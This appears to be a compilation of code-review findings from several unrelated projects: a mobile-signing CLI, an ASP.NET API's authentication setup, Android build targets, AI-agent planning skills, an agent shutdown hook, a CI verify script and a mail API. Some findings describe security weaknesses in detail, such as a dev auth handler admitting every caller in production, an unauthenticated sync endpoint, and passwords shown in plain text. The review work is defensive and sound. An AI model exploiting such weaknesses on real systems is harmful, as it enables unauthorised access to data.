The Apple API key and Google service account key files are uploaded before the remaining fields are prompted and validated, and before the destination is created, so any later exit leaves orphaned key records on the server. An interactive user uploads the .p8, then cancels at the Key ID, Issuer ID or Team ID prompt (prompt calls process.exit(0)), or destination create returns 400. The uploaded key stays on the server unlinked. Each retry adds another one. The Android path at line 180 does the same.

Provisioning profiles are uploaded before the certificate exists, then linked with a second PATCH. If certificate creation fails (wrong password, bad file), the uploaded profiles are left orphaned. `CreateAppProvisioningProfileDto.certificateId` already supports creating them after the certificate. `--password wrong --provisioning-profile a.mobileprovision`: the profile upload succeeds, then `appCertificatesService.create` throws on the bad password. The profile is left with no certificate. A cheaper fix: create the certificate first, then call `create({ ..., certificateId })` for each profile and drop `updateMany`.

`promptAppSelection` now hard-codes `limit: 50` and has no paging or search, so for every command, apps beyond the first 50 in an org can't be selected interactively. An org with 60 apps runs any interactive command (builds, channels, deployments, etc.). Only 50 apps appear in the select list, so the other 10 can only be reached with an explicit --app-id. This shared helper is used by about 30 commands, not just the new ones.

The update commands send a PATCH and print success even when no updatable field was passed. They also ask for a raw ID via a text prompt instead of offering the select list that get/delete use. `apps:certificates:update --app-id A --certificate-id C` with no other flags sends a body with only the IDs and prints 'Certificate updated successfully.' even though nothing changed. Interactive users have to know and type the UUID. The same applies to destinations/update.ts:602.

If `--name` is given without `--platform` in interactive mode, the name is silently dropped: the user is asked for a platform and then gets an unfiltered list. `apps:certificates:delete --name prod-cert` in a terminal skips the `name && platform` branch, asks for platform, then lists every certificate for that platform. The user may pick and delete a different certificate than the one they named. The same applies to certificates/delete.ts, destinations/get.ts and destinations/delete.ts.

Certificate passwords, key passwords and Apple app-specific passwords are prompted with `type: 'text'`, so the secret is shown on screen as it is typed. A user enters the keystore password at 'Enter the certificate password:'. It is echoed in plain text and stays in terminal scrollback and screen recordings. The same happens at create.ts:139 and destinations/create.ts:296.

The ~35-line platform-select/name-lookup/select-resource block is copied almost verbatim into certificates/get, certificates/delete, destinations/get and destinations/delete. This breaks the repo CLAUDE.md rule "**DRY Code**: Avoid code duplication by using services and utility functions." Four copies of the same resolution logic need to be fixed together (for example, the ignored --name bug above). A shared helper such as `promptCertificateSelection(appId, {name, platform})`, next to `promptAppSelection` in utils/prompt.ts, would remove about 140 duplicated lines. Rule source: CLAUDE.md (repo root).

None of the ten new commands has a test, while sibling commands (for example apps/channels/*.test.ts) each have one. Bugs like the unreachable non-interactive `appleApiKeyId` path would have been caught by a simple non-interactive test like the ones in channels/create.test.ts. Regressions in these multi-step create flows will go unnoticed.

Four new service methods repeat the same FormData + `getHeaders()` + Bearer-token upload code (apple-api-keys, google-service-account-keys, provisioning-profiles, certificates). Any change to how uploads work (auth header, content length, progress) has to be made in four places. A small `uploadFile(url, buffer, fileName, fields)` helper, or using the existing per-service pattern once, would cover all four.

UseAuthentication/UseAuthorization are added, but the CoreSync middleware has no authorization metadata and the RequireSyncReadWrite policy is never applied, so sync requests are never actually rejected. With Auth:UseEntraId=true, a request with no token or a forged token reaches app.UseCoreSyncHttpServer() as an anonymous user. UseAuthorization only enforces endpoint metadata, and CoreSync is plain middleware with none, so anyone can pull or push the whole sync database. The commit message's claim that sync is now protected is not true.

GetValue<bool>("Auth:UseEntraId") defaults to false, and the setting only exists in appsettings.Development.json (there is no appsettings.json), so any non-Development deployment silently uses DevAuthHandler, which accepts every request. In a Production or Staging deployment, appsettings.Development.json isn't loaded, so UseEntraId is false and DevAuthHandler signs in every caller as dev-user/dev-tenant. All RequireAuthorization() endpoints, including AI chat that costs money and vocabulary writes, are open to the internet. src/SentenceStudio.Web/Program.cs:20 has the same problem. Production should default to Entra ID, or DevAuth should be gated on IsDevelopment().

JwtBearer/Microsoft.Identity.Web map inbound claims by default (MapInboundClaims), so "tid" and "oid" arrive under the long schemas.microsoft.com/identity/claims/* URIs and FindFirstValue("tid"/"oid") returns null. With a real Entra access token, TenantId resolves to null because the "tenant_id" fallback isn't in Entra tokens. UserId falls back to NameIdentifier, which is the mapped pairwise "sub", not oid. Vocabulary progress is then keyed by the wrong ID, and tenant scoping is empty. The bootstrap endpoint's fallbacks at Program.cs:103 hit the same lookup gap.

The test token adds both Entra claims (tid/oid) and the DevAuth claims (tenant_id, NameIdentifier, ClaimTypes.Name/Email), which real Entra tokens don't have, so API_ExtractsTenantContext passes even if the tid/oid lookup is broken. If you remove the "tid"/"oid" lookups from TenantContextMiddleware, API_ExtractsTenantContext still passes because the tenant_id/NameIdentifier fallbacks supply the values. The test gives false confidence that Entra claim extraction works. Real Entra tokens carry tid, oid, name, preferred_username and scp, and the test token should match that.

The factory keeps UseEntraId=false (DevAuth is registered) and bolts a hand-made JwtBearer scheme on top, so AddMicrosoftIdentityWebApi, the scope policies, and the Identity.Web claim mapping are never tested. A misconfigured AzureAd section, a broken Microsoft.Identity.Web registration, or a scope policy failure in the real Entra branch would all go unnoticed. The "Testing" environment also doesn't load appsettings.Development.json, and the tests share the developer's real %AppData%/sentencestudio/server DB.

RequireUserRead/RequireUserWrite/RequireAiAccess/RequireSyncReadWrite are registered, but every endpoint uses plain .RequireAuthorization() with the default policy, so token scopes (scp) are never checked. A token issued for this audience with no ai.access scope, or with only user.read, can still call /api/v1/ai/chat or write vocabulary status. If someone later adds .RequireAuthorization("RequireAiAccess"), dev mode throws InvalidOperationException (policy not found), because the policies only exist in the Entra branch.

The env var Auth__UseEntraId=false overrides appsettings, so Entra can't be turned on from config when running under Aspire. The web (CoreSync) project gets no matching env vars, so the two services' auth settings can drift apart. A developer sets Auth:UseEntraId=true in the API's appsettings or user-secrets to test Entra locally through AppHost. The env var silently wins and DevAuth stays active. Flipping only the AppHost value changes api but not web, leaving the sync server in a different auth mode.

This new file is an exact copy of src/SentenceStudio.Api/Auth/DevAuthHandler.cs. The useEntraId registration block in Web/Program.cs also duplicates the one in Api/Program.cs. The two handlers and registration blocks have to be kept in sync by hand. A change to dev claims (for example adding tid/oid so DevAuth matches the Entra claim shape) will be made in one place and missed in the other. Move the handler and an AddSentenceStudioAuth(IConfiguration) extension into a shared project such as ServiceDefaults.

The same AzureAd Instance/TenantId/ClientId/Audience values are hard-coded in AppHost.cs, Api/appsettings.Development.json and Web/appsettings.Development.json. If you rotate the app registration or move tenants, you have to edit three files. Missing one leaves a service validating tokens against a stale audience, which shows up as 401s. Keep the values in one place, either AppHost parameters passed to both projects or the appsettings files alone.

Email falls back to preferred_username, which is a UPN or sign-in name rather than a verified email. DisplayName also falls back to the same value. For guest or B2B users, or tenants where the UPN differs from the mailbox (for example user_contoso.com#EXT#@tenant.onmicrosoft.com), Email ends up holding a non-deliverable UPN, and DisplayName shows that same string when the name claim is missing.

NativeAOT.targets is imported (via Microsoft.Android.Sdk.targets) before Xamarin.Android.Common.targets/Resource.Designer.targets, so _AndroidRunNativeCompile's new dependency chain runs _CollectPreTrimmingAssemblies before _AddResourceDesignerToPublishFiles has added the designer dll to ResolvedFileToPublish; nothing in _CollectPreTrimmingAssemblies depends on it explicitly. NativeAOT Release build with a legacy AndroidX/XForms library: the designer lives in $(_OuterIntermediateOutputPath), which is not among the resolver search dirs. FixLegacyResourceDesignerStep.LoadDesigner fails to resolve it and logs only a debug message ('Not using _Microsoft.Android.Resource.Designer'), so no library gets rewritten. ILC then compiles the libraries with their stale compile-time resource IDs, which gives wrong resources or a crash at runtime, and the build reports no error. Fix: add _AddResourceDesignerToPublishFiles to DependsOnTargets of _CollectPreTrimmingAssemblies.

_AndroidRunNativeCompile now DependsOnTargets="_PreTrimmingFixLegacyDesignerUpdateItems", but that target is defined only in TypeMap.LlvmIr.targets, which Xamarin.Android.Common.targets imports only when _AndroidTypeMapImplementation != 'trimmable'. NativeAOT app with _AndroidTypeMapImplementation=trimmable (a supported setup: TypeMap.Trimmable.NativeAOT.targets exists). LlvmIr.targets is not imported, so MSBuild fails with MSB4057 'The target "_PreTrimmingFixLegacyDesignerUpdateItems" does not exist in the project' and every NativeAOT trimmable build breaks.

_PreTrimmingFixLegacyDesignerUpdateItems swaps in any .dll that has a file of the same name in prelink/, not just the assemblies this run produced, and nothing ever deletes old prelink outputs. Build 1: library Foo 1.0 has a legacy designer, so prelink/Foo.dll gets written. The user then upgrades to Foo 2.0, which already uses the designer assembly (or no longer has a Resource class). The task reruns, ProcessAssemblyDesigner returns false, and prelink/Foo.dll is not overwritten. Because Exists() still matches, ResolvedFileToPublish is pointed at the old Foo 1.0 binary and the app ships the outdated library, which can fail with MissingMethodException or similar. Fix: clear OutputDirectory at the start of the task, and swap only items listed in a persisted list of ModifiedAssemblies.

Prelink files are added to FileWrites only when _PreTrimmingFixLegacyDesigner actually executes (task Output items are not inferred for skipped targets), and the target's Outputs is only a stamp that does not track the prelink files. On an incremental build where the target is up to date, FileWrites does not contain prelink/*.dll, so IncrementalClean (or any partial clean) can delete them while the stamp survives. On the next build the target is still skipped because the stamp is newer than the inputs. UpdateItems then finds no prelink files and hands the unrewritten legacy libraries to ILLink, so the libraries keep stale resource IDs at runtime. The same happens if a user deletes obj/.../prelink by hand.

All assemblies share one resolver. GetFixupKey skips an ldsfld whenever the referenced field still resolves, so library B's references to library A's Resource fields are rewritten only if A was processed (and cleared) before B. The order comes from ResolvedFileToPublish order. Library B reads A.Resource.Layout.foo and is processed before A. The field still resolves, so B keeps its ldsfld. A is then rewritten and ClearDesignerClass(completely:true) removes the field from prelink/A.dll. ILLink and the runtime then see B pointing at a field that no longer exists, causing MissingFieldException or a trimming warning. Now that the rewrite runs before ILLink, this shows up as a trimming failure instead of being hidden by preservation.

_PreTrimmingSwappableItem matches every ResolvedFileToPublish .dll by %(Filename) alone, with no PostprocessAssembly/RelativePath filter, so unrelated items that share a name with a prelink output are replaced too. Satellite or culture-specific items, or a duplicate-named dll published under a different RelativePath (for example Foo.dll in a subfolder), are replaced by prelink/Foo.dll. Metadata is copied from the original item, so the wrong binary is published at that path. Restricting the swap to %(PostprocessAssembly)=='true' items, or to the task's ModifiedAssemblies output, avoids this.

Inputs="@(_PreTrimmingAssembly)" includes the main app assembly (and the designer), which change on almost every edit, even though the task always skips the main assembly. Any code change therefore makes the task reload and rewrite every legacy library with Cecil. Every incremental Release build after a one-line app code change re-reads all PostprocessAssembly dlls (with symbols) and rewrites every legacy library and its pdb, which adds seconds to the inner loop for apps with many AndroidX/XForms libraries. Excluding $(TargetName) from Inputs, or using per-assembly Inputs/Outputs with prelink outputs, would avoid this.

The PR removes the designer TrimmerRootDescriptor and moves the rewrite before ILLink, but the only test changes are apkdesc size baselines. Nothing checks that legacy library resource accesses are rewritten and still resolve after trimming, or that incremental builds keep the prelink swap. The NativeAOT ordering problem, stale prelink copies, and IncrementalClean deletion described above all produce correctly sized APKs with wrong or missing resource IDs, so the size baselines pass while the app is broken. A build test should inspect a linked legacy library's IL for designer property calls, including a second, incremental build.

_CollectPreTrimmingAssemblies copies the _PostTrimmingAssembly filter verbatim, and the same PublishTrimmed/AndroidUseDesignerAssembly condition is repeated on three targets that all hook AfterTargets=ComputeResolvedFilesToPublishList, even though the latter two are already reached through DependsOnTargets. Changes to the filter or the condition (for example adding RunILLink, or the trimmable-typemap guard needed above) have to be made in several places, and the redundant AfterTargets hooks make execution order harder to reason about, which is how the NativeAOT ordering bug got in. Keep AfterTargets only on _PreTrimmingFixLegacyDesignerUpdateItems and put the condition in a single property.

The staleness check can never reuse a plan. Phase 4.5 rewrites the story file after Phase 4.1 has written the tasks file, so the story file is always the newer one. Run /x-story-plan story-0028-0002, then run it again without touching the story. mtime(story) > mtime(tasks) because Section 8.1 was written last, so the run is treated as stale and all 5 subagents relaunch every time. RULE-002 idempotency never takes effect.

The TPP ordering lists collection before conditional, in the tpp_level enum, the §3.3 ordering and the planning guide. The QA prompt (lines 279-284) and x-test-plan put conditional at Level 4 and collection at Level 5. QA tags a compound-boolean test as `conditional` (Level 4) and a map/filter test as `collection` (Level 5). Consolidation sorts nil→constant→scalar→collection→conditional, so the Level 5 task is scheduled before the Level 4 one, breaking strict TPP order. DoR check #2 (UT-N follow TPP ordering) then contradicts the generated task order.

`total_checks` is computed from `mandatory_passed` when it should use the fixed 10 mandatory checks, so the summary denominator shrinks as checks fail. 8 of 10 mandatory checks pass and no conditionals apply. total_checks = 8 + 0 = 8 and total_passed = 8, so the DoR file says 'Passed: 8/8' while the verdict is NOT_READY. Readers see a perfect score next to a failing verdict.

MERGE (Rule 1) fires on any tasks from different agents that share a component and layer. It runs before PAIR, so it folds QA RED tests, TL VERIFY gates and ARCH GREEN implementation into a single task. QA-001 (RED, UserValidator, domain), ARCH-003 (GREEN, UserValidator, domain) and TL-002 (VERIFY, UserValidator, domain) all match Rule 1 and become one merged task with no single tdd_phase. The RED/GREEN separation is lost, and Rule 3 then adds a synthetic RED for a test that already existed. Merging should also require the same tdd_phase/type.

DoR checks 1, 3 and 9 need architecture, security and implementation plan files to exist, but this skill never writes those files. On the reuse path there is no agent output to fall back on either. The staleness check decides to reuse and jumps straight to Phase 5 with no subagents. architecture-story-*.md, security-story-*.md and plan-story-*.md do not exist because only tasks/task-plan/planning-report/dor files are written. Checks 1, 3 and 9 fail and the verdict is always NOT_READY, even for a story that was READY on the previous run.

The new core skill is picked up automatically by SkillsAssembler.selectCoreSkills(), but golden files and smoke/expected-artifacts.json were not updated. It is also missing from SkillGroupRegistry.SKILL_GROUPS and has no github-copilot counterpart. Golden-file and AssemblerRegressionSmokeTest comparisons now see an extra .claude/skills/x-story-plan (and .agents/skills/x-story-plan) directory that the expected outputs don't have, so the tests fail. Copilot users get no x-story-plan skill, unlike sibling story skills such as x-story-map.md.

The staleness check (0.3) runs before the story-exists check (0.4). Comparing mtimes against a missing story file can lead to reuse and skipping straight to Phase 5. The story file was renamed or deleted but tasks-story-*.md is still there. The mtime comparison against a non-existent file is undefined or false, the orchestrator reuses the old plan and runs DoR against a missing story, and the 'Story file not found' abort is never reached.

The final ordering puts every RED task first, then every GREEN task. That conflicts with the implicit 'domain before application' dependencies and with per-cycle Red-Green-Refactor. An application-layer RED test is ordered ahead of the domain GREEN tasks, but §3.4 says application tasks depend on domain tasks. The phase ordering and the DAG disagree, so TASK-NNN numbering doesn't match execution order, and all tests are written before any implementation instead of one cycle per scenario.

Conditional checks 11 and 12 look for a compliance assessment in the Security agent's output and contract-test scenarios in the QA agent's output, but neither prompt asks for them. In a project with compliance != none or contract_tests == true, the Security prompt only says to read the compliance KP and the QA prompt never mentions contract tests. The outputs usually lack these sections, so checks 11 and 12 fail and the story is NOT_READY because of prompt gaps, not story gaps.

The consolidation rules, DoR checks and ordering are copied between SKILL.md and planning-guide.md, and the two copies already disagree. The guide's Rule 2 adds 'verification task depends on augmented task' and its Rule 5 says PO amendments go into Phase 4.5. SKILL.md says PO amendments are applied to the story's AC section, and 4.5 only touches Section 8. Two sources of truth will keep drifting. SKILL.md should reference the guide instead of restating it.

The DoR pre-check reads a `## Final Verdict` section, but the DoR checklist that x-story-plan writes has no such section. The verdict appears only as `| Verdict | X |` in the Header table and as `Verdict: **X**` under `## Summary`, and there is no branch for a verdict that can't be parsed. x-story-plan writes `dor-story-0028-0002.md` with `Verdict: **NOT_READY**` under `## Summary`. The epic orchestrator looks for `## Final Verdict`, finds nothing, and matches neither the READY nor the NOT_READY branch. The behaviour is undefined, and in practice the story gets dispatched even though its DoR failed.

The DoR step `a0` is described only in Section 1.1b. The real Core Loop in Section 1.3 (step 6) and parallel dispatch (Section 1.4a, line 783) were not updated. Parallel stories are also dispatched at step 4, before step 6 runs, so a check placed at 6.a0 would come after dispatch anyway. An agent following the 1.3 algorithm literally dispatches the parallelBatch through worktrees at step 4 and marks the stories IN_PROGRESS without any DoR check. NOT_READY stories still get implemented.

Step 1b keeps DONE tasks as DONE even for stories that Step 1 moved from FAILED to PENDING for a retry. A retry closes the old PR and the lifecycle starts a new branch from develop, so the DONE tasks' commits are not on the new branch. A story fails after TASK-001 and TASK-002 are DONE (commitSha on `feat/story-...`). On `--resume` the PR is closed and the story is re-dispatched from develop. The subagent skips TASK-001 and TASK-002 because they are DONE, and the new PR is missing their code.

The per-task status update (editing story Section 8.1 and execution-state) comes after Phase 8 step 10, `git checkout develop && git pull origin develop`. The story-file edits therefore land on develop's working tree instead of the story branch or PR. In PRE_PLANNED mode the lifecycle checks out develop and then marks each TASK-NNN as Concluida in the story file. The changes are left uncommitted on develop (or get committed straight to develop) and never appear in the story's PR.

Task statuses are written only once, in Phase 8, after every task is finished, and nothing ever writes IN_PROGRESS or per-task DONE as tasks complete. The task-level resume in epic-implement Step 1b therefore never has partial progress to resume from. A story is interrupted after 3 of 6 tasks are committed. execution-state has no `tasks` entries, or all of them are PENDING, because Phase 8 never ran. On resume all 6 tasks run again, which contradicts the advertised 'only incomplete tasks are re-executed'.

PRE_PLANNED requires all 7 standalone artifacts. x-story-plan does not write architecture, test, security or compliance files (that content lives in planning-report sections), and the compliance file exists only when compliance is active. The mode table also has no row for 'all artifacts exist but some are stale'. After running x-story-plan on a project without compliance, the files `compliance-story-*.md`, `architecture-story-*.md` and others are missing. The mode resolves to HYBRID and the task-by-task path never runs. Separately, if all 7 exist but one is stale, no mode row matches (it is not PRE_PLANNED, and HYBRID/INLINE don't apply).

A story blocked by DoR is marked BLOCKED with no `blockedBy` field. On resume, Step 2 keeps any story with undefined `blockedBy` BLOCKED permanently, so it stays blocked even after the DoR is fixed and re-planned to READY. story-0028-0003 is NOT_READY and gets marked BLOCKED. The user re-runs x-story-plan, which now returns READY, then runs `--resume`. Step 2 sees `blockedBy` undefined and keeps it BLOCKED, so getExecutableStories never returns it and its dependents stall.

The DoR path is hardcoded to `plans/epic-{epicId}/plans/...`, while x-story-plan now resolves suffix directories (`plans/epic-XXXX-*`). x-story-plan's own step 0.5 `test -f` and its output paths (Sections 4.x) also still use the hardcoded path. The epic lives at `plans/epic-0028-foo/`. x-story-plan writes the DoR there, but the epic orchestrator looks in `plans/epic-0028/plans/`, finds nothing, and takes the 'backward compatible, proceed' branch. NOT_READY stories are silently dispatched.

The TPP levels were swapped (Level 4 = collection, Level 5 = conditional). This contradicts x-test-plan, which defines Level 4 as Complex Conditions and Level 5 as Iterations. The QA agent in x-story-plan orders UTs collection-before-conditional, while x-test-plan or the existing tests-story plans order them the other way. DoR check #2 ('UT-N follow TPP ordering 1–6') then gives different answers depending on which definition is applied, and task order becomes inconsistent across skills.

Only the java-quarkus/.claude x-dev-lifecycle golden was regenerated. The x-dev-implement and x-dev-epic-implement goldens, and the other ~69 x-dev-lifecycle goldens (other profiles and the .github/.codex/.agents targets), still have the old content. Golden-file comparison tests generate output from the updated templates and diff it against these stale goldens. They fail for every profile/target except java-quarkus/.claude x-dev-lifecycle.

Review evidence is matched by branch name in the sidecar filename, but real review sidecars are named `<agent>--<contentHash>.json` (see review-gate.js:140,152), so the check never matches real evidence. The hook also ignores the `branch` JSON field that merge-gate relies on. Knuth reviews feat/123-x and writes `knuth--a1b2c3d4e5f6.json`. The filename has no `feat-123-x` in it, so hasReviewEvidence stays false and the guard blocks shutdown even though the review is done. The user is pushed to `--force-shutdown` every time.

The branch comes from the hook process's cwd, which is the team lead's checkout. It is not the target implementer's branch or worktree, so the guard checks the wrong branch. Drucker runs on main and voss-implement-773 works on feat/773 in its own worktree. The guard sees `main` and exits 0, so it never protects implementers in the agent-teams flow it was written for. If the lead happens to be on some other feature branch, that branch's sidecars decide whether an unrelated implementer can shut down.

`f.includes(sanitizedBranch)` is a plain substring check, so a branch name that is a prefix of another branch name collides with it. On branch `feat/12-x`, an old sidecar for `feat/12-xyz` (`...feat-12-xyz.json`) contains `feat-12-x`. The guard counts it as evidence and allows shutdown of an implementer whose branch was never reviewed.

A sidecar existing only means a review happened. It does not show that findings were routed to the implementer and acknowledged, which is the invariant from task SKILL.md:80 and issue #795. A reviewer writes its sidecar with 3 `[DEFECT]` findings. Drucker sends shutdown_request right away, the guard sees the sidecar and allows it, and the implementer dies before getting the findings. That is exactly the premature shutdown #795 was meant to stop.

Any string message that contains the substring `shutdown_request` is treated as a shutdown, even ordinary chat text. Lead sends voss-implement the text "Don't respond to a shutdown_request until Knuth's findings arrive". The guard treats it as a shutdown and blocks the message, so the instruction never gets delivered.

The positive test uses a made-up sidecar name `knuth--feat-123-test.json` that doesn't follow the real `<agent>--<contentHash>.json` format. This hides the matching bug and makes the hook look correct. Tests pass, but with real review-skill sidecars the guard always blocks. There is also no test for the lead-on-main or worktree case, or for prefix collisions.

`/implement/i` matches any recipient name containing "implement", not just the `{agent}-implement[-qualifier]` naming convention. A reviewer named `szabo-review-implementation` or a researcher named `turing-preimplementation` matches. Their shutdown is blocked whenever the current branch has no sidecar.

The guard does not lstat or reject symlinks and does not exclude `.cleanup-manifest.json`. Merge-gate had guards for exactly this added in #769/#794. A symlink or a non-regular file in `.dev-team/.reviews/` whose name contains the branch counts as review evidence. The hardening just added to merge-gate is missing in the new sibling hook.

Branch sanitizing and sidecar-to-branch matching copy merge-gate's `sanitizeBranch` and its filter logic instead of sharing a helper in `templates/hooks/lib/`. The two copies have already drifted: this one has no JSON `branch` field check and no symlink guard. Future fixes have to be made in both hooks. A shared `lib/sidecars.js` (findBranchSidecars) next to git-cache.js would keep them in sync.

The hook hardcodes `main`/`master` as the non-feature branches. Repo-root CLAUDE.md says shipped templates must be "Workflow-agnostic — don't assume PRs, specific branch naming, or any particular development workflow". In a project whose trunk is `develop` or `trunk`, the guard treats the trunk as a feature branch and blocks implementer shutdown there. Projects with a different trunk name get different behavior, which goes against the CLAUDE.md template rule.

In the unquoted `<<SH` heredoc, `\"` is kept verbatim, so the remote script runs `command -v \"jq\"` inside `$(...)`. That parses as a fresh context, so `command -v` gets an argument with literal double-quote characters. For jq the remote shell runs `command -v '"jq"'`, which finds nothing, so `binary_path` is empty and the probe exits with `missing_binary:jq`. This happens for every non-wrapper binary (jq, rg, ffmpeg, uv, gh, …), so Check 3 and the sandbox image check fail on every healthy deploy. Fix: `command -v ${binary}` or `command -v '${binary}'`.

The list of expected binaries now comes from the CI checkout (`runtime_binary_manifest_in_repo`) instead of the manifest baked into the image. The in-image manifest is only checked for existence and its contents are ignored. verify.yml runs `actions/checkout@v4` with no `ref`, so it checks out the workflow ref, while `inputs.deployed_ref` can name a different build. If main adds a binary to runtime-binaries.json and you verify an older deployed ref, verify reports it missing and fails a good deploy. If main drops or changes an entry, verify can pass even though the image doesn't match. The same mismatch applies to a sandbox image built from another ref.

`runtime_wrapper_bin` is now read from the CI runner's `OPENCLAW_RUNTIME_WRAPPER_BIN`, while the old probe read it from the container's environment, where Dockerfile and Dockerfile.sandbox set it with `ENV`. If Dockerfile or Dockerfile.sandbox ever sets OPENCLAW_RUNTIME_WRAPPER_BIN to something other than /opt/daisy/bin, the runner doesn't see that value. verify then runs `test -x /opt/daisy/bin/gemini` and fails with 'Missing wrapper-backed runtime binary' even though the wrapper is installed correctly. In the reverse case, a runner env var points the check at the wrong path.

The calls `gce_ssh "${manifest_check_command}"` and `gce_ssh "${wrapper_test_command}"` don't redirect stdout. That output lands in the caller's `$(verify_runtime_binaries_for_target …)` capture and is then printed with `printf '%s\n' "${runtime_bins}"`. On a first IAP connection, gcloud prints SSH key fingerprints and randomart to stdout. `gce_ssh_lastline` exists to filter exactly this noise, but here it is mixed into the runtime_bins listing and written to CI logs, which leaks key material and corrupts the `arch=`/tab-separated output.

The old version ran one remote probe per target. The new one makes about 2 + N SSH calls per target, plus 2 for each wrapper binary, and in image mode each call also starts a `docker run --rm` container. With the current 12-entry manifest on amd64, that is about 15 IAP SSH sessions for the app container and another 15 for the sandbox image, roughly 30 sequential gcloud IAP handshakes (several seconds each), compared with 2 before. The verify job gets much slower and more prone to flaky IAP failures. Batching all non-wrapper checks into one remote `sh -c` probe would restore a single round trip.

The `image` branch of `build_target_direct_exec_command` duplicates the prefix match, the forbidden-character check, the `read -a` split and the `%q` arg quoting from `build_direct_exec_smoke_command`. The container branch also declares `smoke_suffix`, `arg` and `smoke_args` locals it never uses. Two copies of the long metacharacter blacklist will drift. A fix to one (for example also rejecting `$` or a backtick) silently won't apply to the other target mode. Extracting one `parse_smoke_args` helper that emits the escaped arg string, and having both branches call it, removes about 20 duplicated lines.

`build_target_manifest_check_command`, `build_target_arch_command`, `build_target_wrapper_test_command`, `build_target_shell_command` and `build_target_direct_exec_command` each repeat the same `case container) docker exec T CMD …; image) docker run --rm --entrypoint CMD T …` switch. About 90 lines of boilerplate where one `build_target_exec_command mode target cmd args...` helper would do. Every change to how a target is invoked (sudo, flags, user) has to be made in five places.

Each loop iteration pipes `entry_json` into `jq` three separate times to pull out binary, smoke and wrapper type. That is 36 extra jq processes per target for 12 entries. A single `jq -r '.[] | select(...) | [.binary, .smoke, (.install.wrapper.type // "")] | @tsv'` read with `IFS=$'\t' read -r binary smoke_command wrapper_type` does the same work in one process.

The underlying problem (wrapper-backed binaries being smoked through `sh -c`) could have been fixed inside the existing in-container probe by exec'ing `"${binary_path}"` directly with split args. Instead, manifest resolution, arch detection and per-binary probing were all moved to the runner. The rewrite introduces the manifest mismatch, the env mismatch, the SSH fan-out and the duplicated builders listed above, plus about 240 lines of new shell. A targeted change to the old single probe would have fixed the gemini wrapper without any of those regressions.

AGENTS.md (included by CLAUDE.md) says: "Fix errors by adjusting the codebase - not tests, CI checks or deployment scripts (last resort)." This branch fixes the wrapper smoke failure by rewriting the CI verification script scripts/verify.sh. The rule asks for fixes to the codebase first and treats CI/deploy script edits as a last resort. Here the verify check itself was reworked, and in doing so it stopped using the in-image manifest as its source of truth.

Catching InvalidOperationException to return 404 MailboxNotFound also catches MailKit's ServiceNotAuthenticated/ServiceNotConnected exceptions (which derive from InvalidOperationException), and every other SMTP failure (SmtpCommandException, AuthenticationException, SocketException, CryptographicException from Unprotect, ParseException) escapes as an unhandled 500. If a mailbox has SmtpRequiresAuth=false (or an empty stored password) and the server needs auth, SendAsync throws ServiceNotAuthenticatedException and the user gets 404 'Mailbox not found'. If the SMTP server rejects a recipient or is unreachable, the user gets a raw 500 with no localized message.

The DataAnnotations on SendMailRequest ([Required], [MinLength], [StringLength(998)], [MaxLength], [RegularExpression]) are never enforced because the API doesn't call AddValidation(), and minimal APIs don't validate them otherwise. POST {"mailboxId":...,"subject":"x","body":"y","contentType":"x"} with no `to` binds To=null, so `request.To.Length` throws an NRE (500). A null Subject throws inside the MimeKit Subject setter. A multi-MB body or an arbitrary ContentType also passes through.

ImapClient.GetFolder(SpecialFolder.Sent) throws NotSupportedException when the server lacks SPECIAL-USE/XLIST instead of returning null, so the `??` name-based fallback never runs. On GreenMail (the dev server) or any IMAP server without SPECIAL-USE, the exception is swallowed by the outer catch, nothing is appended to Sent, and the only trace is a warning log. Sent mail never shows up in the Sent folder.

getHtml returns Quill 2's internal root.innerHTML, where every list is an <ol> with data-list="bullet|ordered" and indent/align are ql-* classes, instead of using getSemanticHTML(). A bullet list in the rich editor arrives at the recipient as a numbered list: the sanitizer strips data-* attributes and recipients don't have Quill's CSS. Turndown also turns it into '1.' items when switching to Markdown. Indentation and colors that rely on classes are lost.

setHtml assigns root.innerHTML directly, which bypasses Quill's clipboard/Delta model; it should use quill.clipboard.dangerouslyPasteHTML (or setContents). After switching Markdown→Rich, Quill's Delta and history aren't in sync with the DOM. Undo can wipe the content, and markup that marked produces but Quill doesn't support (tables, nested blocks) sits in the editor unnormalized and gets sent as-is.

The error response body is read into `error` and then discarded, so the server's localized messages (e.g. which address is invalid, mailbox not found) are never shown; every failure shows the generic 'ComposeSendFailed'. The server rejects 'bob@example' as invalid and returns {message, email}, but the user only sees 'Send failed' with no hint of which field to fix. The unused variable also wastes a read.

SMTP/IMAP connect uses the bool overload (false → StartTlsWhenAvailable), while MailTestEndpoints tests the same mailbox settings with SecureSocketOptions.None/SslOnConnect, so the connection test and real send negotiate TLS differently. If a server advertises STARTTLS with a self-signed or invalid certificate, the mailbox 'Test connection' succeeds (None), but sending fails with an SslHandshakeException, which surfaces as a 500.

HTML mail is sent as a lone text/html part with no text/plain alternative; use BodyBuilder with both HtmlBody and TextBody. Every rich-text or 'send formatted' message is HTML-only. That raises spam scores (e.g. SpamAssassin MIME_HTML_ONLY) and leaves text-only clients with raw markup.

Re-declares the 'MailboxSmtpPassword'/'MailboxImapPassword' purpose strings as private constants, now a fourth copy, instead of adding them to the existing DataProtectionPurposes class.
